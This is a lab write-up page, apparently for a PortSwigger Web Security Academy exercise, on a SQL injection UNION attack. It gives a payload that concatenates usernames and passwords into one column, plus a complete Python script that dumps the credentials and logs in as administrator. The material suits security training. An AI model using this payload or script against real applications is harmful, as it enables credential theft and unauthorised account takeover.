@@ -1,0 +1,145 @@
+---
+title: '10 SQLi Lab'
+description: 'SQL injection for retrieving multiple values in a single column'
+---
+
+import { Aside } from 'astro-pure/user'
+
+## SQL injection UNION attack, retrieving multiple values in a single column
+
+<div style="text-align: justify;">
+  This lab demonstrates how to retrieve multiple values in a single column using SQL injection and a `UNION` attack. The vulnerable product category filter returns query results in the application's response. The database contains a `users` table with `username` and `password` columns. By concatenating the two columns into a single value using `||'~~'||`, all credentials can be retrieved in one column. This allows extraction of the administrator credentials needed to solve the lab.
+</div>
+
+<Aside>
+  Start Burp Suite before running the script — it uses a proxy for visibility.
+</Aside>
+
+### How Exploit Works
+- The `category` parameter in `/filter` is vulnerable to SQL injection.
+- Verify the number of columns and which columns return text (e.g. `'+UNION+SELECT+NULL,'abc'--`).
+- Use a payload like `'+UNION+SELECT+NULL,username||'~~'||password+FROM+users--` to retrieve all usernames and passwords in a single column.
+- Parse the response to extract credentials.
+- Log in using the administrator account to complete the lab.
+
+### Usage
+
+```cmd
+python3 exploit.py https://<your-lab-id>.web-security-academy.net
+```
+
+### Exploit
+
+```python title="exploit.py"
+import requests
+import sys
+import urllib3
+from bs4 import BeautifulSoup
+
+# Disable SSL warnings
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+# Burp Suite proxy (optional, comment out if not needed)
+proxies = {
+    'http': 'http://127.0.0.1:8080',
+    'https': 'http://127.0.0.1:8080'
+}
+
+def check_burp():
+    """Check if Burp Suite proxy is running."""
+    try:
+        requests.get("http://127.0.0.1:8080", timeout=3)
+    except requests.exceptions.RequestException:
+        print("[-] Burp Suite is not running. Please start it and try again.")
+        sys.exit(1)
+
+def exploit_sqli(url, payload):
+    """Exploit SQLi and extract credentials table."""
+    full_url = url.rstrip("/") + payload
+    res = requests.get(full_url, verify=False, proxies=proxies, timeout=10)
+    res.raise_for_status()
+
+    soup = BeautifulSoup(res.text, "html.parser")
+    creds = {}
+
+    rows = soup.find_all("tr")
+    for row in rows:
+        cols = row.find_all(["th", "td"])
+        if len(cols) == 1:  # single column with "username~~password"
+            combo = cols[0].get_text(strip=True)
+            if "~~" in combo:
+                username, password = combo.split("~~", 1)
+                creds[username] = password
+
+    return creds
+
+def login(url, username, password):
+    """Log in using CSRF token and credentials, then check if lab solved."""
+    login_url = url.rstrip("/") + "/login"
+    session = requests.Session()
+
+    # Step 1: Get CSRF token
+    res = session.get(login_url, verify=False, proxies=proxies)
+    res.raise_for_status()
+
+    soup = BeautifulSoup(res.text, "html.parser")
+    csrf_token = soup.find("input", {"name": "csrf"})["value"]
+
+    # Step 2: Submit login form
+    data = {
+        "csrf": csrf_token,
+        "username": username,
+        "password": password
+    }
+
+    res = session.post(login_url, data=data, verify=False, proxies=proxies)
+    res.raise_for_status()
+
+    if "Log out" in res.text:
+        print(f"[+] Logged in as {username}. Checking if lab is solved...")
+
+        # Step 3: One last GET on base URL
+        base_res = session.get(url, verify=False, proxies=proxies)
+        base_res.raise_for_status()
+
+        if "Congratulations" in base_res.text:
+            print("[+] Lab solved! 🎉")
+            return True
+        else:
+            print("[-] Logged in but lab not solved yet.")
+            return False
+    else:
+        print("[-] Login failed.")
+        return False
+
+def main():
+    if len(sys.argv) != 2:
+        print(f"Usage: python {sys.argv[0]} <url>")
+        print(f"Example: python {sys.argv[0]} https://example.com")
+        sys.exit(1)
+
+    url = sys.argv[1].strip()
+    check_burp()
+
+    payload = "/filter?category='+UNION+SELECT+NULL,username||'~~'||password+FROM+users--"
+
+    print("[*] Exploiting SQL injection...")
+    creds = exploit_sqli(url, payload)
+
+    if not creds:
+        print("[-] No credentials found!")
+        sys.exit(1)
+
+    print("[*] Extracted credentials:")
+    for user, pw in creds.items():
+        print(f"   {user} : {pw}")
+
+    if "administrator" in creds:
+        print("[*] Trying to log in as administrator...")
+        login(url, "administrator", creds["administrator"])
+    else:
+        print("[-] Administrator account not found.")
+
+if __name__ == "__main__":
+    main()
+```
